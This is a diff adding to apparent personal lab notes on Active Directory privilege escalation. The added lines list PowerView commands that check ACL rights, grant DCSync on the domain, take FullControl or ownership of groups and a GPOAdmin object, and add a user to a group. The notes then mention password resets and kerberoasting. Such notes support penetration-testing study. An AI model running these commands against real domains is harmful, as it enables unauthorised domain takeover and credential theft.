@@ -57,5 +57,23 @@ we can add members to a group when we have GenericAll, GenericWrite, Self, AllEx
     PS C:\Tools> net use K: \\DC01\TestGroup
     PS C:\Tools> ls K:\flag.txt
 
+we can grant rights and ownerships when we have WriteDACL or WriteOwner
+  checking our rights
+    PS C:\Tools> $userSID = ConvertTo-SID luna
+    PS C:\Tools> Get-DomainSID | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}
+    PS C:\Tools> Get-DomainObjectAcl -Identity GPOAdmin -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID} #specifically for WriteOwner
+  if we verify WriteDACL on the domain, then grant ourselves desired rights like DCSync
+    PS C:\Tools> Add-DomainObjectAcl -TargetIdentity $(Get-DomainSID) -PrincipalIdentity luna -Rights DCSync -Verbose
+  if we verify WriteDACL on a group or user, we can assign FullControl 
+    PS C:\Tools> Add-DomainObjectAcl -TargetIdentity "Finance" -PrincipalIdentity "luna" -Rights All
+    then we can add ourselves to the group
+      Add-DomainGroupMember -Identity "Finance" -Members "luna"
+  if we verify WriteOwner on an object, we can claim ownership
+    PS C:\Tools> Set-DomainObjectOwner -Identity GPOAdmin -OwnerIdentity pedro -Verbose
+    then we can modify the DACL
+      PS C:\Tools> Add-DomainObjectAcl -TargetIdentity GPOAdmin -PrincipalIdentity pedro -Rights All -Verbose
+  NOTE: if we take ownership of a group, we can now add ourselves to the group
+        if we take ownership of a user, we can reset their password or kerberoast
+
 resources:
 https://www.thehacker.recipes/ad/movement/dacl#abuse
